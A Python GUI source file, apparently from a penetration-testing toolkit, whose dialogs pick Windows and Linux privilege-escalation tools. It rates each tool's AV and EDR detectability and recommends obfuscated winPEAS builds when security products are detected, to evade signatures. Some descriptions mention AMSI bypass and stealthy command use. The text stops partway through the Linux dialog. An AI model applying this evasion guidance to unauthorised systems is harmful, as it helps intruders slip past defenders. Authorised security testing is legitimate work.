# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK - Dialogs v1.0
- Greenbone install: 10-second countdown popup watching xterm for password
- Selectable text: CTkTextbox (disabled) for all technical content
- OS detection dialog fixed (grab_set)
- Netcat with service-specific verification commands
"""

import os
import re
import time
import threading
import subprocess
import shlex
import json
import tempfile
import shutil
import socket
import pathlib
import urllib.request

from gui.dialogs_common import *

def show_windows_privesc_context_dialog(parent, app, on_tool_selected):
    """AV/EDR context dialog shown before any Windows privesc tool launch.

    Asks the user about the target environment (lab / AV base / EDR pro)
    and recommends the appropriate tool with duration + detection warnings.
    `on_tool_selected(tool_id)` is called when the user picks a tool —
    the caller then opens the matching workflow.

    tool_id is one of: "winpeas_bat", "winpeas_exe", "privesc_check",
    "powerup", "manual"
    """
    # Dialog default bumped from 1000×700 → 1200×720.  The 1000×700
    # version looked wide enough at design time, but the AV/EDR/
    # Coverage detail row eats ~780 px of horizontal space by itself,
    # leaving <200 px for the USE THIS TOOL button on the same row.
    # On the user's setup the button was getting pushed off-screen
    # until they manually resized the dialog.  We ALSO move the
    # button to its own row below the details (see _make_card() loop
    # further down) so a narrow dialog can't hide it any more —
    # this width bump is the belt, the separate row is the suspenders.
    win = _make_win(parent, "Windows Privilege Escalation — Choose Approach", 1200, 720)

    _title(win, "🪟  WINDOWS PRIVILEGE ESCALATION")

    # Sub-heading explaining the flow now that there's no context-picker:
    # each card declares its own "Best for:" contexts via coloured badges,
    # and clicking the per-card button launches that tool's workflow
    # directly (no intermediate "select then proceed" step).
    _sub(win,
         "Pick the tool you want — each card shows which environments "
         "it fits best.  The USE THIS TOOL button launches it directly.",
         COLORS["text_dim"])

    # ── Context labels shared across all cards ──────────────────────
    # Each context gets a coloured dot + long label.  A tool declares
    # which contexts it fits in its `ctx` list below — we turn that
    # into a stack of inline badges on the right of the card header.
    _CTX_LABELS = {
        "lab":     ("🔵", "Best for: Lab / No AV",
                    COLORS.get("text_cyan", "#7EC8E3")),
        "av_base": ("🟡", "Best for: Windows Defender or commercial AV",
                    COLORS["text_yellow"]),
        "edr":     ("🔴", "Best for: EDR / AV Enterprise",
                    COLORS["text_red"]),
    }

    # ── Tool catalogue ──────────────────────────────────────────────
    TOOLS_INFO = [
        {
            "id":       "winpeas_bat",
            "name":     "winpeas.bat",
            "icon":     "🐌",
            "ctx":      ["lab"],
            "duration": "20-40 min",
            "size":     "~1-2 MB output",
            "av":       "⚠ Low — batch script, no binary signature",
            "edr":      "⚠ Behavioral detection possible",
            "coverage": "🏆 Maximum — 40+ check categories",
            "desc":     (
                "The original winPEAS batch script. Runs hundreds of Windows commands "
                "sequentially — users, services, registry, files, credentials, network. "
                "Very slow because each check spawns a new process. No AV signature "
                "(it's plain text) but EDRs with behavioral rules may flag the volume "
                "of reg/wmic calls. Best for labs and CTFs with no AV."
            ),
        },
        {
            "id":       "winpeas_exe",
            "name":     "winpeas.exe",
            "icon":     "⚡",
            "ctx":      ["lab"],
            "duration": "2-4 min",
            "size":     "~300-800 KB output",
            "av":       "🔴 Detected immediately — known binary hash",
            "edr":      "🔴 Blocked — signature in every AV database",
            "coverage": "🏆 Maximum — same as .bat, compiled",
            "desc":     (
                "Compiled version of winPEAS — same checks as the .bat but runs in "
                "2-4 minutes instead of 40. Downside: every AV and EDR knows its hash. "
                "Windows Defender blocks it on sight. Use ONLY in labs with AV disabled "
                "or already bypassed. If Defender is active, use PrivescCheck instead."
            ),
        },
        {
            "id":       "privesc_check",
            "name":     "PrivescCheck.ps1",
            "icon":     "🛡",
            "ctx":      ["lab", "av_base", "edr"],
            "duration": "2-4 min",
            "size":     "~150-500 KB (HTML report)",
            "av":       "🟡 Low — PowerShell in-memory, AMSI bypass needed",
            "edr":      "🟡 Medium — script-based, no binary on disk",
            "coverage": "🟢 High — focused on privesc vectors",
            "desc":     (
                "Modern alternative to winPEAS by itm4n. Runs entirely in PowerShell "
                "memory — nothing written to disk on the target (except the optional "
                "-Report). Covers service misconfigs, registry privesc, token privileges, "
                "scheduled tasks, credentials, DLL hijacking. Generates a clean HTML + "
                "CSV report. Requires AMSI bypass (included in the execution command). "
                "Best choice when Windows Defender or an EDR is active."
            ),
        },
        {
            "id":       "powerup",
            "name":     "PowerUp.ps1",
            "icon":     "🔧",
            "ctx":      ["lab", "av_base"],
            "duration": "1-3 min",
            "size":     "console output (no report)",
            "av":       "🟡 Low — PowerShell script, dot-sourced from disk",
            "edr":      "🔴 High — well-known PowerSploit signatures / AMSI",
            "coverage": "🟢 Focused — service & registry privesc checks",
            "desc":     (
                "PowerSploit's PowerUp — the classic service-misconfig hunter. "
                "Invoke-AllChecks looks for unquoted service paths, modifiable "
                "service binaries/configs, AlwaysInstallElevated, weak scheduled-"
                "task permissions and token privileges, and prints a ready-to-run "
                "abuse function for each hit. Output is short and self-explanatory "
                "(no parser needed). Older than PrivescCheck and heavily signatured "
                "— prefer PrivescCheck when Defender / an EDR is active."
            ),
        },
        {
            "id":       "manual",
            "name":     "Manual Commands",
            "icon":     "🎯",
            "ctx":      ["edr"],
            "duration": "5-10 min",
            "size":     "No file generated",
            "av":       "🟢 Stealth — individual native commands",
            "edr":      "🟢 Low footprint — blends with normal activity",
            "coverage": "⚠ Targeted — only what you run",
            "desc":     (
                "Run individual Windows commands manually in the target shell. No script, "
                "no binary — just whoami /priv, reg query, schtasks, wmic, net user. "
                "Maximum stealth: each command looks like normal admin activity. "
                "Requires knowing what to look for. Use when EDR is active and you need "
                "surgical precision. HAWK shows you a curated checklist of the most "
                "impactful commands."
            ),
        },
    ]

    # ── Scrollable stack of tool cards ──────────────────────────────
    tool_scroll = ctk.CTkScrollableFrame(
        win, fg_color=COLORS["bg_card"],
        border_color=COLORS["border_dim"], border_width=1,
        corner_radius=6,
        scrollbar_button_color=COLORS["border_dim"])
    tool_scroll.pack(fill="both", expand=True, padx=16, pady=(6, 4))

    def _pick(tid):
        """Each card's USE THIS TOOL button lands here: close the
        dialog and hand the chosen tool id back to the caller's
        callback.  No intermediate "selected" state, no bottom-of-
        dialog PROCEED button — one click = launch."""
        _safe_destroy(win)
        try:
            on_tool_selected(tid)
        except Exception as e:
            print(f"[HAWK] privesc tool launch failed: {e}")

    for ti in TOOLS_INFO:
        card = ctk.CTkFrame(
            tool_scroll, fg_color=COLORS["bg_secondary"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=4)
        card.pack(fill="x", padx=6, pady=5)

        # Top row: icon+name left, meta (⏱ duration, 📦 size) right.
        top_row = ctk.CTkFrame(card, fg_color="transparent")
        top_row.pack(fill="x", padx=8, pady=(8, 2))
        ctk.CTkLabel(
            top_row, text=f"{ti['icon']}  {ti['name']}",
            font=_f("lg", True), text_color=COLORS["text_bright"],
            anchor="w").pack(side="left")
        meta = ctk.CTkFrame(top_row, fg_color="transparent")
        meta.pack(side="right")
        ctk.CTkLabel(
            meta, text=f"⏱ {ti['duration']}",
            font=_f("sm"), text_color=COLORS["text_dim"],
            anchor="e").pack(side="left", padx=6)
        ctk.CTkLabel(
            meta, text=f"📦 {ti['size']}",
            font=_f("sm"), text_color=COLORS["text_dim"],
            anchor="e").pack(side="left", padx=6)

        # Best-for badge strip: one badge per context the tool fits.
        # Keeps layout readable even when a tool (PrivescCheck) fits
        # all three contexts — the strip wraps naturally because each
        # badge is packed side="left" into a transparent frame.
        badge_strip = ctk.CTkFrame(card, fg_color="transparent")
        badge_strip.pack(fill="x", padx=10, pady=(2, 2))
        for ctx_key in ti["ctx"]:
            label = _CTX_LABELS.get(ctx_key)
            if not label:
                continue
            dot, text, col = label
            ctk.CTkLabel(
                badge_strip,
                text=f"  {dot}  {text}  ",
                font=_f("xs", True),
                text_color=col,
                fg_color=COLORS["bg_card"],
                corner_radius=3,
            ).pack(side="left", padx=(0, 6), pady=2)

        # Description — wraplength generous because dialog baseline
        # is now 1000px (see _make_win call above).
        ctk.CTkLabel(
            card, text=ti["desc"],
            font=_f("sm"), text_color=COLORS["text_dim"],
            anchor="w", wraplength=880, justify="left"
        ).pack(fill="x", padx=10, pady=(2, 4))

        # Details row — AV / EDR / Coverage only.  We used to pack
        # the USE THIS TOOL button onto this same row (side="right")
        # but the three labels alone eat ~780 px of horizontal space,
        # which pushed the button off-screen on narrow dialogs.
        det_row = ctk.CTkFrame(card, fg_color="transparent")
        det_row.pack(fill="x", padx=10, pady=(0, 4))
        ctk.CTkLabel(
            det_row, text=f"AV: {ti['av']}",
            font=_f("xs"), text_color=COLORS["text_muted"],
            anchor="w").pack(side="left", padx=(0, 12))
        ctk.CTkLabel(
            det_row, text=f"EDR: {ti['edr']}",
            font=_f("xs"), text_color=COLORS["text_muted"],
            anchor="w").pack(side="left", padx=(0, 12))
        ctk.CTkLabel(
            det_row, text=f"Coverage: {ti['coverage']}",
            font=_f("xs"), text_color=COLORS["text_muted"],
            anchor="w").pack(side="left")

        # Action row — dedicated to the USE THIS TOOL button, right-
        # aligned on its own line.  Always fully visible regardless
        # of dialog width, regardless of how long the AV/EDR/Coverage
        # strings above end up being.
        btn_row = ctk.CTkFrame(card, fg_color="transparent")
        btn_row.pack(fill="x", padx=10, pady=(0, 8))
        ctk.CTkButton(
            btn_row, text="▶  USE THIS TOOL",
            width=180, height=30,
            font=_f("sm", True),
            fg_color=COLORS["bg_card"],
            hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_green"], border_width=1,
            text_color=COLORS["text_green"], corner_radius=3,
            command=lambda t=ti["id"]: _pick(t),
        ).pack(side="right")

    # ── Bottom button — only CANCEL ─────────────────────────────────
    row = _btn_row(win)
    _btn(row, "CANCEL", lambda: _safe_destroy(win), w=140)


# winPEAS.exe needs .NET Framework 4.  Map the Windows NT major.minor to
# "ships .NET 4 by default?":  NT <= 6.1 (XP / 2003 / Vista / 7 / 2008 /
# 2008 R2) predates it, so every .exe variant loads silently and drops a
# 0-byte file there — the caller must redirect to winPEAS.bat instead.
# 6.2 / 6.3 (8 / 8.1 / 2012 / 2012 R2) and 10.0 (10 / 11 / 2016+) ship
# .NET 4.5+, so the .exe runs even though classify_generation() still
# buckets 8..2012 R2 as "legacy" for Connect-flag purposes.
_PRE_DOTNET4_NT    = {"5.0", "5.1", "5.2", "6.0", "6.1"}
_DOTNET4_READY_NT  = {"6.2", "6.3", "10.0"}
_PRE_DOTNET4_VER   = {"2000", "xp", "2003", "2003 r2", "vista",
                      "2008", "2008 r2", "7"}
_DOTNET4_READY_VER = {"8", "8.1", "2012", "2012 r2",
                      "10", "11", "2016", "2019", "2022", "2025"}


def _is_pre_dotnet4_windows(fp):
    """Tri-state (True / False / None): does the target predate .NET 4?

    Reads the SMB/NTLM product version FIRST — it is negotiated over the
    wire and survives a wrong ``nmap -O`` guess.  The 2008 R2 DC here
    mis-IDs as "Embedded Standard 7 / Windows Phone" in ``os_raw`` yet
    negotiates ``6.1.7601`` over SMB, so the old ``os_raw``/``version``
    keyword scan missed it and wrongly recommended a .exe variant.  The
    ``version`` string (also SMB-sourced, e.g. "2008 R2 SP1") is the
    secondary signal.

    Returns None when neither reliable signal is present, so the caller
    can fall back to the noisier ``os_raw`` keyword scan WITHOUT that scan
    ever overriding a confirmed verdict (a modern box mis-guessed as
    "Windows 7" by ``-O`` must still get the .exe)."""
    if fp is None:
        return None
    pv = (getattr(fp, "ntlm_product_version", "") or "").strip()
    if pv:
        mm = ".".join(pv.split(".")[:2])
        if mm in _PRE_DOTNET4_NT:
            return True
        if mm in _DOTNET4_READY_NT:
            return False
    base = re.sub(r"\s*sp\d+\s*$", "",
                  (getattr(fp, "version", "") or "").lower()).strip()
    if base in _PRE_DOTNET4_VER:
        return True
    if base in _DOTNET4_READY_VER:
        return False
    return None


_WINPEAS_EXE_VARIANTS = [
    {
        "id": "any",
        "name": "winPEASany.exe",
        "runtime": ".NET 4+",
        "arch": "any",
        "obfuscated": False,
        "desc": ("Any-CPU build — runs on both x86 and x64 hosts at "
                 "the cost of a slightly larger binary.  Best when "
                 "the target architecture is unknown."),
        "url": ("https://github.com/peass-ng/PEASS-ng/releases/"
                "latest/download/winPEASany.exe"),
        "local_name": "winPEASany.exe",
        "script_name": "winPEASany.exe",
    },
    {
        "id": "any_ofs",
        "name": "winPEASany.exe (obfuscated)",
        "runtime": ".NET 4+",
        "arch": "any",
        "obfuscated": True,
        "desc": ("Obfuscated any-CPU build — same compatibility as "
                 "winPEASany.exe but with renamed methods/strings to "
                 "evade signature-based AV/EDR detections."),
        "url": ("https://github.com/peass-ng/PEASS-ng/releases/"
                "latest/download/winPEASany_ofs.exe"),
        "local_name": "winPEASany_ofs.exe",
        "script_name": "winPEASany_ofs.exe",
    },
    {
        "id": "x64",
        "name": "winPEASx64.exe",
        "runtime": ".NET 4+",
        "arch": "x64",
        "obfuscated": False,
        "desc": ("Native x64 build — smallest and fastest on 64-bit "
                 "hosts.  Will not run on 32-bit Windows."),
        "url": ("https://github.com/peass-ng/PEASS-ng/releases/"
                "latest/download/winPEASx64.exe"),
        "local_name": "winPEASx64.exe",
        "script_name": "winPEASx64.exe",
    },
    {
        "id": "x64_ofs",
        "name": "winPEASx64.exe (obfuscated)",
        "runtime": ".NET 4+",
        "arch": "x64",
        "obfuscated": True,
        "desc": ("Obfuscated x64 build — native x64 performance with "
                 "AV/EDR evasion via renamed internals."),
        "url": ("https://github.com/peass-ng/PEASS-ng/releases/"
                "latest/download/winPEASx64_ofs.exe"),
        "local_name": "winPEASx64_ofs.exe",
        "script_name": "winPEASx64_ofs.exe",
    },
    {
        "id": "x86",
        "name": "winPEASx86.exe",
        "runtime": ".NET 4+",
        "arch": "x86",
        "obfuscated": False,
        "desc": ("Native x86 build — use on confirmed 32-bit targets "
                 "for the smallest binary size."),
        "url": ("https://github.com/peass-ng/PEASS-ng/releases/"
                "latest/download/winPEASx86.exe"),
        "local_name": "winPEASx86.exe",
        "script_name": "winPEASx86.exe",
    },
    {
        "id": "x86_ofs",
        "name": "winPEASx86.exe (obfuscated)",
        "runtime": ".NET 4+",
        "arch": "x86",
        "obfuscated": True,
        "desc": ("Obfuscated x86 build — x86 native with AV/EDR "
                 "evasion."),
        "url": ("https://github.com/peass-ng/PEASS-ng/releases/"
                "latest/download/winPEASx86_ofs.exe"),
        "local_name": "winPEASx86_ofs.exe",
        "script_name": "winPEASx86_ofs.exe",
    },
]


def _recommend_winpeas_exe_variant(fp, auto_findings) -> tuple[
        "str | None", str, bool]:
    """Pick the best winPEAS variant for the current target.

    Returns (variant_id, reason_text, redirect_to_bat).

    When `redirect_to_bat` is True, NO .exe variant fits — the
    target is legacy (Win 7 / Server 2008 R2 / older) where .NET 4
    is almost certainly absent and the .exe would 0-byte silently.
    The caller should hint the user to use the separate winpeas.bat
    card instead.
    """
    os_raw = ""
    version = ""
    arch_hint = ""
    if fp is not None:
        os_raw   = (getattr(fp, "os_raw", "")   or "").lower()
        version  = (getattr(fp, "version", "")  or "").lower()
        # arch hint can live in fp.arch, platform, os_raw, or banners
        arch_hint = (
            (getattr(fp, "arch", "")     or "") + " " +
            (getattr(fp, "platform", "") or "") + " " +
            (getattr(fp, "os_raw", "")   or "")
        ).lower()

    # Legacy OS detection.  Match on both the human label and NT
    # version number (5.x / 6.0 / 6.1 = XP / 2003 / Vista / 7 /
    # 2008 / 2008 R2).
    legacy_keywords = (
        "windows xp", "server 2003", "server 2008", "windows 7",
        " 5.1", " 5.2", " 6.0", " 6.1",
        "vista",
    )
    # Reliable pre-.NET-4 verdict (SMB/NTLM product version) wins; the
    # os_raw keyword scan is only trusted when that verdict is unknown, so
    # a wrong `nmap -O` guess can no longer flip the recommendation either
    # way (2008 R2 mis-ID'd as "7" is still caught; a modern box mis-ID'd
    # as "Windows 7" is NOT wrongly sent to the .bat).
    hay = f" {os_raw} {version} "
    pre_net4 = _is_pre_dotnet4_windows(fp)
    if pre_net4 is True or (pre_net4 is None
                            and any(k in hay for k in legacy_keywords)):
        return (None,
                "Target reports a legacy Windows version (XP / "
                "Server 2003 / 2008 / 2008 R2 / Vista / Windows 7) "
                "whose default install ships .NET 3.5 only.  Any "
                "winPEAS.exe variant would load silently and "
                "produce a 0-byte output file.  Recommendation: "
                "switch to the separate WINPEAS (download) card "
                "which grabs winPEAS.bat (batch script, no runtime "
                "required).",
                True)

    # AV detection — scan auto-findings for known endpoint product
    # names.  If any hit, lean towards the obfuscated variant.
    av_seen = False
    try:
        for f in (auto_findings or []):
            blob = ((f.get("title", "") + " "
                     + f.get("description", "") + " "
                     + f.get("source", "")).lower())
            if any(k in blob for k in (
                    "defender", "crowdstrike", "sentinel",
                    "cortex", "carbon black", "eset",
                    "kaspersky", "symantec", "mcafee",
                    "sophos", "bitdefender", "cylance",
                    "trend micro", "fireeye")):
                av_seen = True
                break
    except Exception:
        pass

    # Architecture heuristic.
    arch = "any"
    if any(k in arch_hint for k in ("x64", "amd64", "x86_64",
                                     "64-bit", "64bit")):
        arch = "x64"
    elif any(k in arch_hint for k in ("x86", "i386", "i686",
                                       "32-bit", "32bit")):
        arch = "x86"

    # Select variant from arch + av combo.
    if arch == "x64":
        if av_seen:
            return ("x64_ofs",
                    "x64 target with an AV/EDR signal in Target "
                    "Intel → obfuscated x64 build bypasses "
                    "signature hashes while staying native to the "
                    "architecture.",
                    False)
        return ("x64",
                "x64 target, no AV/EDR fingerprinted yet → native "
                "x64 build is smallest + fastest.",
                False)
    if arch == "x86":
        if av_seen:
            return ("x86_ofs",
                    "x86 target with AV/EDR signal → obfuscated "
                    "x86 build.",
                    False)
        return ("x86",
                "x86 target, no AV/EDR fingerprinted → native "
                "x86 build.",
                False)
    # Unknown arch
    if av_seen:
        return ("any_ofs",
                "Architecture couldn't be determined AND an AV/EDR "
                "signal was spotted → obfuscated any-CPU build "
                "plays safe on both fronts.",
                False)
    return ("any",
            "Architecture couldn't be determined, no AV/EDR "
            "fingerprinted → any-CPU build runs on both x86 and "
            "x64 at the cost of a slightly larger binary.",
            False)


def show_winpeas_exe_preflight_dialog(parent, app,
                                        on_variant_chosen) -> None:
    """Open the smart preflight picker.

    `on_variant_chosen` receives ONE argument: a dict matching an
    entry of `_WINPEAS_EXE_VARIANTS` (url, local_name, script_name,
    …).  The caller uses that dict to override the `winpeas_exe`
    tool's cmd_template and to pass the right script_name to
    `PostExploitGuideDialog` later.

    The .bat card is NOT included as a direct option in this dialog
    — .bat has its own card in the privesc picker and its own
    workflow.  If the recommendation says the target is too legacy
    for any .exe (redirect_to_bat=True), we surface a prominent
    hint + a button that closes this dialog and pops a message
    telling the operator which card to click.
    """
    fp = None
    auto_findings = []
    try:
        ti = getattr(app, "target_intel", None)
        if ti is not None:
            fp = getattr(ti, "_fp", None)
            auto_findings = (
                getattr(ti, "_auto_findings", []) or [])
    except Exception:
        pass

    rec_id, reason, redirect_bat = _recommend_winpeas_exe_variant(
        fp, auto_findings)

    # Summaries of what the fingerprint says, surfaced at the top
    # of the dialog so the operator sees what HAWK's decision was
    # based on.
    fp_os   = (getattr(fp, "os_raw", "") if fp else "") or "<unknown>"
    fp_ver  = (getattr(fp, "version", "") if fp else "") or "—"
    fp_arch = (getattr(fp, "arch", "")    if fp else "") or "<unknown>"
    av_seen = False
    try:
        for f in auto_findings:
            blob = ((f.get("title", "") + " "
                     + f.get("description", "") + " "
                     + f.get("source", "")).lower())
            if any(k in blob for k in (
                    "defender", "crowdstrike", "sentinel",
                    "cortex", "carbon black", "eset",
                    "kaspersky", "symantec", "mcafee",
                    "sophos", "bitdefender", "cylance",
                    "trend micro", "fireeye")):
                av_seen = True
                break
    except Exception:
        pass

    win = _make_win(
        parent,
        "winPEAS.exe — Smart Preflight  (pick a variant)",
        1200, 800)
    _title(win, "🔎  WINPEAS.EXE — Smart Preflight")
    _sub(win,
         "HAWK recommends the best variant for this target.  "
         "The final choice is always yours.",
         COLORS["text_dim"])

    # ── Fingerprint + recommendation box ────────────────────────
    _note_box(
        win,
        f"Target fingerprint  :  {fp_os}\n"
        f"NT version          :  {fp_ver}\n"
        f"Architecture        :  {fp_arch}\n"
        f"AV / EDR detected   :  "
        f"{'YES (from Target Intel findings)' if av_seen else 'No signal yet'}\n"
        f"\n"
        f"HAWK recommendation :  "
        f"{'⚠  USE WINPEAS.BAT CARD INSTEAD' if redirect_bat else '⭐  ' + rec_id}\n"
        f"\n"
        f"Why                 :  {reason}",
        COLORS["text_yellow"] if redirect_bat else COLORS["text_green"])

    # ── Scrollable stack of variant cards ────────────────────────
    scroll = ctk.CTkScrollableFrame(
        win, fg_color=COLORS["bg_card"],
        border_color=COLORS["border_dim"], border_width=1,
        corner_radius=6)
    scroll.pack(fill="both", expand=True, padx=16, pady=(6, 4))

    def _pick(variant: dict):
        _safe_destroy(win)
        try:
            on_variant_chosen(variant)
        except Exception as e:
            print(f"[HAWK] winpeas preflight handler failed: {e}")

    for v in _WINPEAS_EXE_VARIANTS:
        is_rec = (v["id"] == rec_id) and not redirect_bat
        card_border = (COLORS["border_green"] if is_rec
                        else COLORS["border_dim"])
        card_border_w = 2 if is_rec else 1

        card = ctk.CTkFrame(
            scroll, fg_color=COLORS["bg_secondary"],
            border_color=card_border, border_width=card_border_w,
            corner_radius=4)
        card.pack(fill="x", padx=6, pady=5)

        # Top row: name + rec badge + runtime/arch tags
        top = ctk.CTkFrame(card, fg_color="transparent")
        top.pack(fill="x", padx=10, pady=(6, 2))
        name_text = f"{'⭐  ' if is_rec else '     '}{v['name']}"
        ctk.CTkLabel(
            top, text=name_text,
            font=_f("lg", True),
            text_color=(COLORS["text_green"] if is_rec
                        else COLORS["text_bright"]),
            anchor="w").pack(side="left")
        # Runtime + arch + obfuscated tags on the right
        tags = []
        tags.append(v["runtime"])
        tags.append(f"arch:{v['arch']}")
        if v["obfuscated"]:
            tags.append("obfuscated")
        ctk.CTkLabel(
            top, text="   ·   ".join(tags),
            font=_f("sm"), text_color=COLORS["text_dim"],
            anchor="e").pack(side="right")

        # Description
        ctk.CTkLabel(
            card, text=v["desc"],
            font=_f("sm"), text_color=COLORS["text_dim"],
            anchor="w", justify="left", wraplength=1080,
        ).pack(fill="x", padx=12, pady=(2, 4))

        # URL preview (for transparency — the operator sees the
        # exact thing HAWK will curl)
        ctk.CTkLabel(
            card, text=f"       ↳  {v['url']}",
            font=_f("xs"), text_color=COLORS["text_muted"],
            anchor="w", justify="left", wraplength=1080,
        ).pack(fill="x", padx=12, pady=(0, 4))

        # Action row
        act = ctk.CTkFrame(card, fg_color="transparent")
        act.pack(fill="x", padx=10, pady=(0, 8))
        ctk.CTkButton(
            act,
            text=("▶  DOWNLOAD + PROCEED  (recommended)"
                  if is_rec else "▶  DOWNLOAD + PROCEED"),
            width=260, height=28,
            font=_f("sm", True),
            fg_color=COLORS["bg_card"],
            hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_green"], border_width=1,
            text_color=COLORS["text_green"], corner_radius=3,
            command=lambda _v=v: _pick(_v),
        ).pack(side="right")

    # ── Bottom: back-to-.bat hint (shown when legacy OS) + cancel ─
    if redirect_bat:
        ctk.CTkLabel(
            win,
            text=("       ⚠  For legacy Windows (XP / 2003 / 2008 / "
                  "2008 R2 / 7) close this dialog and run the "
                  "separate WINPEAS (download) card → winpeas.bat "
                  "is a plain batch script that works without .NET."),
            font=_f("sm", True), text_color=COLORS["text_yellow"],
            anchor="w", justify="left", wraplength=1180,
        ).pack(fill="x", padx=20, pady=(4, 0))

    row = _btn_row(win)
    _btn(row, "CANCEL", lambda: _safe_destroy(win), w=140)


def show_linux_privesc_context_dialog(parent, app, on_tool_selected):
    """Mirror of show_windows_privesc_context_dialog for Linux
    targets.

    Same UX rules as the Windows version:
      * No horizontal context selector — each card declares its own
        "Best for:" environments via inline coloured badges.
      * Every card's ▶ USE THIS TOOL button launches that tool's
        workflow directly; there is no bottom-of-dialog PROCEED.
      * Only a CANCEL button at the bottom.

    tool_id values passed to the callback:
      "linpeas", "lse", "pspy", "manual"
    The caller's on_tool_selected then either:
      * for linpeas/lse/pspy → triggers a module-level Tool run which
        downloads the script and opens the PEAS Workflow dialog;
      * for manual          → opens the Manual Linux Privesc
                              Checklist dialog (no download).
    """
    win = _make_win(
        parent,
        "Linux Privilege Escalation — Choose Approach", 1200, 720)

    _title(win, "🐧  LINUX PRIVILEGE ESCALATION")
    _sub(win,
         "Pick the tool you want — each card shows which environments "
         "it fits best.  The USE THIS TOOL button launches it directly.",
         COLORS["text_dim"])

    # Context labels — Linux targets rarely have traditional AV, so
    # the grading is "how much auditing/EDR is in the way".
    _CTX_LABELS = {
        "lab":     ("🔵", "Best for: Lab / No audit",
                    COLORS.get("text_cyan", "#7EC8E3")),
        "auditd":  ("🟡", "Best for: auditd / standard syslog",
                    COLORS["text_yellow"]),
        "edr":     ("🔴", "Best for: EDR / AuditD+rules / "
                           "SELinux enforcing",
                    COLORS["text_red"]),
    }

    # ── Tool catalogue ─────────────────────────────────────────────
    TOOLS_INFO = [
        {
            "id":       "linpeas",
            "name":     "linpeas.sh",
            "icon":     "🐌",
            "ctx":      ["lab"],
            "duration": "5-15 min",
            "size":     "~200-800 KB output",
            "av":       "⚠ Low — bash script, no binary signature",
            "edr":      "🔴 Very noisy — runs hundreds of checks, "
                        "reads /etc/*, probes network, dumps env.  "
                        "Any auditd rule watching /etc/shadow or "
                        "capabilities will fire.",
            "coverage": "🏆 Maximum — 30+ check categories",
            "desc":     (
                "The original PEASS-ng script for Linux.  Runs every "
                "well-known Linux privesc check: kernel exploits, "
                "sudo rules, SUID binaries, capabilities, cron, "
                "writable files, Docker/LXD group membership, NFS, "
                "SSH keys, password grep.  No compile, no binary — "
                "just curl | bash.  Best for labs and CTFs where "
                "noise doesn't matter."
            ),
        },
        {
            "id":       "lse",
            "name":     "LSE  (linux-smart-enumeration)",
            "icon":     "⚡",
            "ctx":      ["lab", "auditd"],
            "duration": "2-5 min (level 2)",
            "size":     "~50-150 KB output",
            "av":       "🟡 Low-to-medium — fewer checks than linpeas",
            "edr":      "🟡 Staged — level 0 is almost silent, level 2 "
                        "matches linpeas noise.  Use `-l 1` on "
                        "sensitive targets.",
            "coverage": "🟢 Focused — by-severity, only prints "
                        "findings above the level threshold",
            "desc":     (
                "Leaner alternative to linpeas by diego-treitos.  "
                "Staged checks: -l 0 = only critical findings, "
                "-l 1 = add interesting, -l 2 = everything (≈ "
                "linpeas territory).  Output is much smaller and "
                "easier to read — use when you want a quick triage "
                "before committing to linpeas."
            ),
        },
        {
            "id":       "pspy",
            "name":     "pspy",
            "icon":     "👁",
            "ctx":      ["lab", "auditd", "edr"],
            "duration": "continuous (10+ min recommended)",
            "size":     "streams stdout — redirect to file",
            "av":       "🟢 Low — compiled Go binary, no unusual "
                        "syscalls (just /proc polling)",
            "edr":      "🟢 Passive monitor — no /etc reads, no "
                        "privileged syscalls, blends with normal "
                        "userland activity",
            "coverage": "🎯 Orthogonal — watches processes + cron "
                        "jobs in real time, NOT an enumeration tool",
            "desc":     (
                "Process monitor that catches short-lived processes "
                "(cron jobs, sudoers ExecStart=, maintenance scripts) "
                "by polling /proc without needing root.  Completely "
                "passive — leave it running for 10+ minutes and "
                "watch what the system does.  Use in parallel with "
                "linpeas/LSE, not as a replacement."
            ),
        },
        {
            "id":       "manual",
            "name":     "Manual Commands",
            "icon":     "🎯",
            "ctx":      ["edr"],
            "duration": "5-10 min",
            "size":     "no file generated",
            "av":       "🟢 Stealth — individual native commands",
            "edr":      "🟢 Low footprint — each command looks like "
                        "normal sysadmin activity",
            "coverage": "⚠ Targeted — only what you run",
            "desc":     (
                "Run individual native commands in the target shell.  "
                "Zero scripts, zero downloads.  Checklist covers: "
                "sudo -l, SUID scan, capabilities, cron enumeration, "
                "group membership, writable critical files, SSH keys, "
                "kernel version CVE lookup.  Use on AuditD-hardened "
                "hosts where a bash script would trigger every rule."
            ),
        },
    ]

    # ── Scrollable stack of tool cards ─────────────────────────────
    tool_scroll = ctk.CTkScrollableFrame(
        win, fg_color=COLORS["bg_card"],
        border_color=COLORS["border_dim"], border_width=1,
        corner_radius=6,
        scrollbar_button_color=COLORS["border_dim"])
    tool_scroll.pack(fill="both", expand=True, padx=16, pady=(6, 4))

    def _pick(tid):
        _safe_destroy(win)
        try:
            on_tool_selected(tid)
        except Exception as e:
            print(f"[HAWK] linux privesc tool launch failed: {e}")

    for ti in TOOLS_INFO:
        card = ctk.CTkFrame(
            tool_scroll, fg_color=COLORS["bg_secondary"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=4)
        card.pack(fill="x", padx=6, pady=5)

        top_row = ctk.CTkFrame(card, fg_color="transparent")
        top_row.pack(fill="x", padx=8, pady=(8, 2))
        ctk.CTkLabel(
            top_row, text=f"{ti['icon']}  {ti['name']}",
            font=_f("lg", True), text_color=COLORS["text_bright"],
            anchor="w").pack(side="left")
        meta = ctk.CTkFrame(top_row, fg_color="transparent")
        meta.pack(side="right")
        ctk.CTkLabel(
            meta, text=f"⏱ {ti['duration']}",
            font=_f("sm"), text_color=COLORS["text_dim"],
            anchor="e").pack(side="left", padx=6)
        ctk.CTkLabel(
            meta, text=f"📦 {ti['size']}",
            font=_f("sm"), text_color=COLORS["text_dim"],
            anchor="e").pack(side="left", padx=6)

        # Best-for badges strip
        badge_strip = ctk.CTkFrame(card, fg_color="transparent")
        badge_strip.pack(fill="x", padx=10, pady=(2, 2))
        for ctx_key in ti["ctx"]:
            label = _CTX_LABELS.get(ctx_key)
            if not label:
                continue
            dot, text, col = label
